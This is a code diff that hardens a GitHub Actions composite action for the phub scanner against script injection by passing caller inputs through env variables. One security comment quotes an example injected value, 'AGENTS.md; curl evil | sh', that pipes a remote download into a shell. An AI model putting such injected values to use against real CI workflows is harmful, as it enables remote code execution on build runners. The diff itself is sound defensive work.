@@ -100,12 +100,20 @@ outputs:
 runs:
   using: composite
   steps:
+    # SECURITY (R03/R11): every caller-controlled input is passed through an
+    # `env:` block and referenced as a shell `$VAR`, NEVER interpolated as
+    # `${{ inputs.* }}` inside a `run:` script. GitHub substitutes `${{ }}`
+    # into the script TEXT before bash parses it, so a value like
+    # `AGENTS.md; curl evil | sh` becomes executable code. Env expansion
+    # happens AFTER parse — `;`/`|`/backticks in the value stay literal data.
     - name: Validate mode
       shell: bash
+      env:
+        PHUB_MODE: ${{ inputs.mode }}
       run: |
-        case "${{ inputs.mode }}" in
+        case "$PHUB_MODE" in
           scan|gate) ;;
-          *) echo "::error::phub-scan: mode must be 'scan' or 'gate' (got '${{ inputs.mode }}')"; exit 2 ;;
+          *) echo "::error::phub-scan: mode must be 'scan' or 'gate' (got '$PHUB_MODE')"; exit 2 ;;
         esac
 
     - name: Setup Node 20
@@ -115,8 +123,11 @@ runs:
 
     - name: Install @primitivehub/phub (${{ inputs.phub-source }})
       shell: bash
+      env:
+        PHUB_SOURCE: ${{ inputs.phub-source }}
+        PHUB_VERSION: ${{ inputs.phub-version }}
       run: |
-        if [ "${{ inputs.phub-source }}" = "local" ]; then
+        if [ "$PHUB_SOURCE" = "local" ]; then
           echo "::group::Installing phub from local monorepo build"
           # Caller is expected to have already built packages/verify
           # and packages/phub. The composite action just symlinks bin/.
@@ -133,8 +144,11 @@ runs:
           export PATH="${RUNNER_TEMP}/phub-bin:$PATH"
           echo "::endgroup::"
         else
-          echo "::group::Installing @primitivehub/phub@${{ inputs.phub-version }} from npm"
-          npm install -g "@primitivehub/phub@${{ inputs.phub-version }}"
+          # PHUB_VERSION is referenced only inside double quotes, so an
+          # injected value resolves to an unresolvable package spec (npm
+          # errors) rather than executing — env expansion is not re-parsed.
+          echo "::group::Installing @primitivehub/phub@${PHUB_VERSION} from npm"
+          npm install -g "@primitivehub/phub@${PHUB_VERSION}"
           echo "::endgroup::"
         fi
         phub --version
@@ -144,19 +158,26 @@ runs:
       if: ${{ inputs.mode == 'scan' }}
       shell: bash
       working-directory: ${{ github.workspace }}
+      env:
+        PHUB_FILES: ${{ inputs.files }}
+        PHUB_SARIF_DIR: ${{ inputs.sarif-directory }}
+        PHUB_FAIL_ON_FINDINGS: ${{ inputs.fail-on-findings }}
       run: |
         set -u
-        mkdir -p "${{ inputs.sarif-directory }}"
+        mkdir -p "$PHUB_SARIF_DIR"
         total_findings=0
         any_failed=0
-        for f in ${{ inputs.files }}; do
+        # Unquoted on purpose: word-split the space-separated list. Because
+        # PHUB_FILES is an env value (not `${{ }}` text), shell metacharacters
+        # in it are literal filenames, not commands.
+        for f in $PHUB_FILES; do
           if [ ! -f "$f" ]; then
             echo "::warning file=$f::phub-scan: file does not exist, skipping"
             continue
           fi
           # Slugify path for a stable .sarif filename (slashes → underscores).
           slug=$(echo "$f" | sed 's:[/]:_:g')
-          sarif_path="${{ inputs.sarif-directory }}/${slug}.sarif"
+          sarif_path="${PHUB_SARIF_DIR}/${slug}.sarif"
           echo "::group::Scanning $f → $sarif_path"
           # phub exits 1 on findings, 2 on errors. --no-fail flips
           # finding-exit to 0 so the loop continues; we track
@@ -178,7 +199,7 @@ runs:
           echo "::error::One or more scans errored (exit 2). Failing the job."
           exit 2
         fi
-        if [ "${{ inputs.fail-on-findings }}" = "true" ] && [ "${total_findings}" -gt 0 ]; then
+        if [ "$PHUB_FAIL_ON_FINDINGS" = "true" ] && [ "${total_findings}" -gt 0 ]; then
           echo "::error::phub-scan: ${total_findings} finding(s); failing job per fail-on-findings=true."
           exit 1
         fi
@@ -192,14 +213,20 @@ runs:
       if: ${{ inputs.mode == 'gate' }}
       shell: bash
       working-directory: ${{ github.workspace }}
+      env:
+        PHUB_FILES: ${{ inputs.files }}
+        PHUB_ALLOW_UNSEALED: ${{ inputs.allow-unsealed }}
+        PHUB_REQUIRE_ATTESTATION: ${{ inputs.require-attestation }}
       run: |
         set -u
         args=()
-        [ "${{ inputs.allow-unsealed }}" = "true" ] && args+=(--allow-unsealed)
-        [ "${{ inputs.require-attestation }}" = "true" ] && args+=(--require-attestation)
+        [ "$PHUB_ALLOW_UNSEALED" = "true" ] && args+=(--allow-unsealed)
+        [ "$PHUB_REQUIRE_ATTESTATION" = "true" ] && args+=(--require-attestation)
         # Pass only files that exist; warn+skip the rest (parity with scan).
+        # Unquoted $PHUB_FILES = intentional word-split; env value, so
+        # metacharacters are literal filenames (see R03/R11 note above).
         present=()
-        for f in ${{ inputs.files }}; do
+        for f in $PHUB_FILES; do
           if [ -f "$f" ]; then
             present+=("$f")
           else
@@ -234,9 +261,11 @@ runs:
     - name: Merge per-file SARIF into a single run
       if: ${{ inputs.mode == 'scan' && inputs.upload-sarif == 'true' && always() }}
       shell: bash
+      env:
+        PHUB_SARIF_DIR: ${{ inputs.sarif-directory }}
       run: |
         shopt -s nullglob
-        files=( "${{ inputs.sarif-directory }}"/*.sarif )
+        files=( "$PHUB_SARIF_DIR"/*.sarif )
         if [ ${#files[@]} -eq 0 ]; then
           echo "::warning::no per-file SARIF to merge"; exit 0
         fi
@@ -244,8 +273,8 @@ runs:
           "$schema": .[0]["$schema"],
           version: .[0].version,
           runs: [{ tool: .[0].runs[0].tool, results: [ .[].runs[0].results[] ] }]
-        }' "${files[@]}" > "${{ inputs.sarif-directory }}/_merged.sarif"
-        echo "merged $(jq '.runs[0].results | length' "${{ inputs.sarif-directory }}/_merged.sarif") finding(s) into one run"
+        }' "${files[@]}" > "$PHUB_SARIF_DIR/_merged.sarif"
+        echo "merged $(jq '.runs[0].results | length' "$PHUB_SARIF_DIR/_merged.sarif") finding(s) into one run"
 
     # Code Scanning may be disabled on the consumer's repo (public repos aren't
     # auto-enabled). Probe first; skip the upload with a clear warning instead of
